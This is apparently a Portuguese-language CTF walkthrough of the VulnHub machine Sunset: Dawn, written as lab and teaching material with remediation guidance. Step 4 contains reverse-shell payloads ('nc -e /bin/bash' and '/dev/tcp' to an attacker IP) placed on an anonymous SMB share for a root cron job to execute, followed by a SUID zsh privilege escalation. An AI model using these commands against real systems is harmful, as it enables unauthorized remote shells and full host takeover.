# Sunset: Dawn — A Luz Que Expõe Tudo

Bora rapaziada, Sunset: Dawn ensina um dos primitivos de ataque mais subestimados em segurança de infraestrutura: se um cron job executa scripts de um compartilhamento de rede no qual você pode escrever, você já tem a máquina. Sério mesmo. A cadeia de ataque é limpa e metódica: enumeração web revela um arquivo de log que expõe o cron job, enumeração SMB encontra o compartilhamento ITDEPT gravável, upload de script malicioso entrega um reverse shell, e um binário zsh com SUID fecha o loop para root. Movimentação lateral clássica encontra privesc clássico. Parabéns ao whitecr0wz pelo design limpo da série Sunset.

| Campo | Valor |
|---|---|
| **Nível** | Intermediário |
| **VM Alvo** | Sunset: Dawn |
| **VM Atacante** | Kali Linux |
| **URL VulnHub** | https://www.vulnhub.com/entry/sunset-dawn,341/ |
| **Técnicas** | Descoberta de host, scan completo de portas, enumeração de diretórios web (dirb), análise de arquivo de log, enumeração SMB (enum4linux, smbclient), abuso de cron job via compartilhamento SMB gravável, upload de reverse shell, exploração de binário SUID (zsh) |
| **CVEs** | Sem CVE específico: explora configuração incorreta (CWE-732 — Atribuição Incorreta de Permissão; CWE-269 — Gerenciamento de Privilégios Inadequado) |
| **Grupos APT** | APT41: uso documentado de enumeração de compartilhamentos SMB e persistência baseada em cron em ambientes Linux corporativos; OceanLotus (APT32): usa abuso de cron job e tarefa agendada como mecanismo primário de persistência e movimentação lateral em alvos Linux |

---

## Resumo do Ataque

```
nmap → HTTP (80), SMB (139/445), MySQL (3306)
  |
  +-> dirb http://192.168.1.165/ → /logs/
  |       |
  |       v
  |   management.log → scripts do compartilhamento ITDEPT executados por cron
  |
  +-> enum4linux → usuários: dawn, ganimedes
  |
  +-> smbclient //192.168.1.165/ITDEPT → gravável, sem autenticação
  |
  +-> upload product-control (payload nc reverse shell)
  |
  +-> aguardar ~60s pela execução do cron
  |
  v
shell como usuário dawn (callback netcat)
  |
  +-> find / -perm -u=s → /usr/bin/zsh (SUID root)
  |
  +-> /usr/bin/zsh → uid=0(root)
  |
  v
/root/flag.txt
```

---

## Metodologia

1. Descoberta de host e scan completo de portas
2. Enumeração web: descobrir diretório /logs/ e management.log
3. Análise de log: identificar cron job executando scripts do compartilhamento SMB ITDEPT
4. Enumeração SMB: confirmar compartilhamento gravável acessível sem credenciais
5. Criação e upload de payload: script malicioso com reverse shell netcat
6. Capturar reverse shell quando o cron disparar (aproximadamente a cada 60 segundos)
7. Enumeração SUID: encontrar /usr/bin/zsh com bit SUID definido
8. Acesso root via zsh SUID

---

## Passo 1 — Descoberta de Host e Scan de Portas

```bash
sudo netdiscover -r 192.168.1.0/24
# Alvo: 192.168.1.165

nmap -A 192.168.1.165
```

Portas abertas:

| Porta | Serviço | Observações |
|---|---|---|
| 80 | HTTP | Apache httpd |
| 139 | NetBIOS-SSN | Samba |
| 445 | SMB | Samba |
| 3306 | MySQL | Possivelmente acessível |

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Enumeração Web e Descoberta de Log

A raiz web na porta 80 mostra página de erro ou conteúdo mínimo. Execute brute-force de diretórios:

```bash
dirb http://192.168.1.165/

# Ou com gobuster para velocidade:
gobuster dir \
  -u http://192.168.1.165/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,html,log \
  -t 40
```

Descoberta: diretório `/logs/` contendo `management.log`.

```bash
curl http://192.168.1.165/logs/management.log
```

O arquivo de log revela:
- Um compartilhamento SMB ITDEPT contendo dois scripts: `product-control` e `web-control`
- Esses scripts são executados por um cron job aproximadamente a cada minuto

Essa é a informação crítica: um compartilhamento de rede cujo conteúdo é executado como root em um agendamento.

**Nota real:** Arquivos de log acessíveis pela web são uma descoberta constante em avaliações de rede interna. Logs revelam detalhes operacionais (tarefas agendadas, caminhos de arquivos, nomes de serviços) que diretamente permitem ataques direcionados. APT41 documenta especificamente a busca por logs acessíveis pela web durante reconhecimento pós-acesso inicial.

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios; T1552.001 — Credenciais em Arquivos

---

## Passo 3 — Enumeração SMB

```bash
# Enumerar compartilhamentos e usuários
enum4linux -a 192.168.1.165
```

Usuários encontrados: `dawn`, `ganimedes`

```bash
# Listar compartilhamentos
smbclient -L //192.168.1.165 -N

# Acessar o compartilhamento ITDEPT (sem credenciais)
smbclient //192.168.1.165/ITDEPT -N
smb: \> ls
# Compartilhamento vazio mas gravável
```

Compartilhamento SMB gravável sem autenticação. Qualquer arquivo carregado aqui será executado como root pelo cron job em ~60 segundos.

**Nota real:** Compartilhamentos SMB graváveis sem autenticação são uma configuração incorreta crítica. Em ambientes corporativos, esse padrão é regularmente explorado para movimentação lateral e persistência. OceanLotus (APT32) usa compartilhamentos SMB graváveis para preparar payloads e manter persistência entre reinicializações.

**MITRE ATT&CK:** T1021.002 — Serviços Remotos: Compartilhamentos SMB/Windows Admin; T1135 — Descoberta de Compartilhamento de Rede

---

## Passo 4 — Upload de Payload e Reverse Shell

Crie os scripts maliciosos correspondendo aos nomes de arquivo esperados do log:

```bash
# Criar payloads de reverse shell
echo "nc -e /bin/bash 192.168.1.100 4444 &" > product-control
echo "nc -e /bin/bash 192.168.1.100 4445 &" > web-control
```

Carregue ambos no compartilhamento ITDEPT gravável:

```bash
smbclient //192.168.1.165/ITDEPT -N
smb: \> put product-control
smb: \> put web-control
smb: \> ls
# Verificar se os arquivos foram carregados
smb: \> quit
```

Inicie o listener netcat antes da próxima execução do cron:

```bash
nc -lvnp 4444
```

Aguarde aproximadamente 60 segundos. O cron job executa o script carregado e uma conexão chega.

**Payload alternativo (se nc -e não estiver disponível no alvo):**

```bash
echo "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1" > product-control
```

**MITRE ATT&CK:** T1059.004 — Interpretador de Comando e Script: Shell Unix; T1053.003 — Tarefa Agendada: Cron

---

## Passo 5 — Estabilização do Shell

```bash
# Quando o reverse shell chegar:
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
export SHELL=bash

# No atacante (Ctrl+Z depois):
stty raw -echo; fg
# Pressione Enter duas vezes
```

Verifique a identidade:

```bash
whoami
# dawn
id
```

**MITRE ATT&CK:** T1059.004 — Interpretador de Comando e Script: Shell Unix

---

## Passo 6 — Escalonamento de Privilégios via zsh SUID

Enumere binários SUID:

```bash
find / -perm -u=s -type f 2>/dev/null
```

Descoberta notável: `/usr/bin/zsh` tem o bit SUID definido e é de propriedade do root.

```bash
/usr/bin/zsh
whoami
# root

cd /root
cat flag.txt
```

(☞ﾟヮﾟ)☞ Root obtido. GG mano!

**Nota real:** SUID em shells interativos (bash, zsh, sh, ksh) é uma escalonamento de privilégios imediata e trivial. SUID significa que o binário é executado como seu proprietário (root) independentemente de quem o executa. Qualquer shell interativo com SUID root é efetivamente um `sudo` sem senha. OceanLotus (APT32) documenta a enumeração de binários SUID como uma das primeiras ações pós-foothold em qualquer host Linux.

**MITRE ATT&CK:** T1548.001 — Mecanismo de Controle de Elevação de Abuso: Setuid e Setgid

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado em | Usado Para |
|---|---|---|---|
| SMB anônimo | Sem credenciais necessárias | Compartilhamento ITDEPT | Upload de script |
| Usuários | dawn, ganimedes | enum4linux | Direcionamento |
| Shell de usuário | dawn | Reverse shell via cron | Acesso inicial |
| Root | uid=0 via zsh SUID | /usr/bin/zsh | Acesso root |
| Flag | /root/flag.txt | Pós-exploração | Máquina concluída |

---

## Lições Aprendidas

| # | Descoberta | Relevância Real | Lição Principal |
|---|---|---|---|
| 1 | Log acessível pela web revela cron job e nome do compartilhamento SMB | Logs expõem detalhes operacionais internos que atacantes usam para direcionamento | Restrinja acesso do servidor web a logs; use controles de acesso com rotação de logs |
| 2 | Compartilhamento SMB gravável sem credenciais e executado por cron | Isso é uma vulnerabilidade completa de execução remota de código: escrever + executar = RCE | Nunca execute scripts de compartilhamentos de rede como root; exija autenticação para todos os compartilhamentos SMB |
| 3 | Bit SUID definido em /usr/bin/zsh | Acesso root imediato com um único comando: sem exploit necessário | Audite todos os binários SUID regularmente; nunca defina SUID em shells interativos |
| 4 | Usuários descobertos via RID cycling SMB (enum4linux) | Enumeração de nomes de usuário permite brute-force direcionado e password spraying | Desabilite a enumeração de sessão nula SMB; restrinja RID cycling anônimo |
| 5 | Execução baseada em cron de conteúdo controlado pelo usuário | Um padrão pervasivo: cron executa arquivos que atacantes podem controlar | Audite todos os cron jobs para caminhos de script graváveis; execute cron como usuário de menor privilégio |

---

## MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Reconhecimento | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Reconhecimento | Descoberta | Descoberta de Compartilhamento de Rede | T1135 |
| Reconhecimento | Descoberta | Descoberta de Contas | T1087 |
| Movimentação Lateral | Movimentação Lateral | Serviços Remotos: Compartilhamentos SMB/Windows Admin | T1021.002 |
| Execução | Execução | Tarefa Agendada: Cron | T1053.003 |
| Execução | Execução | Interpretador de Comando e Script: Shell Unix | T1059.004 |
| Escalonamento de Privilégios | Escalonamento de Privilégios | Mecanismo de Controle de Elevação de Abuso: Setuid e Setgid | T1548.001 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Restringir permissões do compartilhamento SMB:** ITDEPT deve exigir autenticação; remover acesso de escrita para usuários não autenticados
2. **Nunca executar scripts de compartilhamentos de rede como root:** usar scripts locais de propriedade do root com permissões restritas
3. **Remover SUID de /usr/bin/zsh:** `chmod u-s /usr/bin/zsh`; auditar todos os binários SUID com `find / -perm -u=s -type f`
4. **Restringir acesso web a /logs/:** excluir diretórios de log da raiz web; usar `.htaccess` ou configuração do servidor para negar acesso
5. **Desabilitar sessões nulas SMB:** impedir enumeração anônima de usuários e compartilhamentos

### D3FEND

- **D3-ACH** — Hardening de Configuração de Aplicação (autenticação SMB obrigatória; scripts cron restritos)
- **D3-OAM** — Gerenciamento Administrativo do Sistema Operacional (remoção SUID; restrições de acesso a log)
- **D3-NTF** — Filtragem de Tráfego de Rede (bloquear portas SMB; restringir MySQL de redes não confiáveis)

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gerenciamento de Ativos | Inventariar todos os compartilhamentos SMB e suas permissões |
| Proteger | Controle de Acesso | Exigir autenticação para todos os compartilhamentos SMB; restringir fontes de scripts de cron job |
| Proteger | Segurança de Dados | Remover SUID de shells interativos; restringir acesso web a /logs/ |
| Detectar | Anomalias e Eventos | Alertar sobre operações de escrita SMB anônimas; execução de cron job de paths de rede |
| Responder | Planejamento de Resposta | Remover scripts maliciosos dos compartilhamentos; desabilitar acesso SMB anônimo |
| Recuperar | Planejamento de Recuperação | Auditar todos os cron jobs e tarefas agendadas; revisar todos os binários SUID |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-3 | Aplicação de Acesso | Permissões de compartilhamento SMB; acesso ao diretório de log web |
| AC-6 | Menor Privilégio | Cron jobs executam como usuário de menor privilégio; remover SUID de shells |
| CM-7 | Menor Funcionalidade | Desabilitar acesso SMB anônimo; restringir diretórios acessíveis pela web |
| AU-9 | Proteção de Informações de Auditoria | Restringir acesso web a diretórios de log |
| SI-2 | Remediação de Falhas | Remover SUID de shells interativos; corrigir configurações incorretas SMB |

### CISA KEV

Nenhum CVE específico se aplica aqui. No entanto, essa cadeia de ataque mapeia múltiplos documentos de orientação CISA sobre configuração incorreta SMB (AA20-302A) e escalonamento de privilégios Linux via binários SUID. A CISA consistentemente destaca compartilhamentos de rede graváveis e permissões SUID excessivas como classes críticas de configuração incorreta em seu catálogo de avisos.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gerenciamento de Identidade e Acesso (IAM) | Gerenciar Privilégios e Contas | MIL3 |
| Gerenciamento de Ameaças e Vulnerabilidades (THREAT) | Realizar Avaliações de Vulnerabilidade | MIL2 |
| Gerenciamento de Ativos, Mudanças e Configurações (ASSET) | Gerenciar Inventário de Ativos TI e OT | MIL2 |

---

## Considerações Finais

Sunset: Dawn é uma daquelas máquinas onde o caminho pretendido é simples uma vez que você conecta os pontos entre o arquivo de log e o compartilhamento SMB. A lição é real: logs expostos destroem a segurança operacional. Se você pode ler o que o sistema está fazendo, pode prever o que ele executará em seguida. Top demais essa lição, véi.

Thanks guys!! (❍ᴥ❍ʋ)
